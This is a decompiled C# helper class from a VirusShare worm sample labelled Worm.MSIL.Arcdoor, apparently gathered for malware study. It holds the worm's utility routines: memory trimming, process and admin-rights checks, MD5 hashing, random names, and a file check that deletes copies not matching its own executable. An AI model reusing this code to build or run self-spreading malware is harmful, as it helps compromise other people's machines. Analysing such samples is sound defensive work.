// Decompiled with JetBrains decompiler
// Type: SysDriver.cFunctions
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace SysDriver
{
  internal class cFunctions
  {
    public void FlushMemory()
    {
      GC.Collect();
      GC.WaitForPendingFinalizers();
      if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        return;
      cFunctions.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
    }

    public bool checkProcess(string sProcessName) => Process.GetProcessesByName(sProcessName).Length > 0;

    private string FileMD5(string sFileName)
    {
      FileStream inputStream = File.OpenRead(sFileName);
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash((Stream) inputStream);
      inputStream.Close();
      return BitConverter.ToString(hash).Replace("-", "").ToUpper();
    }

    public string getMD5Hash(string sString) => BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(Encoding.Default.GetBytes(sString))).Replace("-", "").ToUpper();

    public string genString(int iLen)
    {
      Random random = new Random();
      string str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      string empty = string.Empty;
      for (int index = 0; index < iLen; ++index)
        empty += str.Substring(random.Next(0, str.Length), 1);
      return empty;
    }

    public bool checkFile(string FilePath)
    {
      if (!File.Exists(FilePath))
        return false;
      if (!(this.FileMD5(FilePath) != this.FileMD5(Process.GetCurrentProcess().MainModule.FileName)))
        return true;
      File.Delete(FilePath);
      return false;
    }

    public bool getAdminStatus()
    {
      try
      {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll")]
    private static extern int SetProcessWorkingSetSize(
      IntPtr process,
      int minimumWorkingSetSize,
      int maximumWorkingSetSize);
  }
}
